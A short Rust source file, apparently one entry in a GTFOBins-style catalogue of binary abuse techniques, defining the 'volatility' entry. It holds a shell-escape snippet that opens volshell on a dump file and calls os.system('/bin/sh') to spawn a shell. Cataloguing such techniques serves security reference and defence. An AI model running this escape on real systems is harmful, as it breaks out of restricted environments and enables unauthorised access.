pub static BIN_NAME: &'static str = "volatility";
pub static BIN_DESC: &'static str = "This command requires some valid coredump file which, if not available, can be uploaded to the target. The `volshell` command spawns a `python` shell, other functions may apply.";
pub static SH_CODE: &'static str = r#"
    
    volatility -f file.dump volshell
    __import__('os').system('/bin/sh')
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
